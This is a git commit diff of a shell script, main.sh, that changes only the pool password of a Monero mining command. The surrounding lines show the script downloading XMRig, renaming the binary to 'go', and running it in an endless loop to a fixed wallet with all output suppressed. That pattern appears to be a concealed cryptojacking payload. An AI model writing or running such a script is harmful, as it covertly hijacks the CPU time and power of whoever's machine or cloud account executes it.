9fb6a81358861ea25a5326f49968bdae0d1411a1
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-11 21:58:58 +0800

    Update main.sh

--- main.sh
+++ main.sh
@@ -14,7 +14,7 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux
 tar -xf xmrig-6.11.2-linux-x64.tar.gz > /dev/null 2>&1
 mv xmrig-6.11.2/xmrig go > /dev/null 2>&1
 while [ 1 ]; do
-./go --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Okbaah -o ca.monero.herominers.com:10191 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages > /dev/null 2>&1
+./go --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Okbaahhh -o ca.monero.herominers.com:10191 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages > /dev/null 2>&1
 sleep 3 > /dev/null 2>&1
 done
 sleep 999 > /dev/null 2>&1
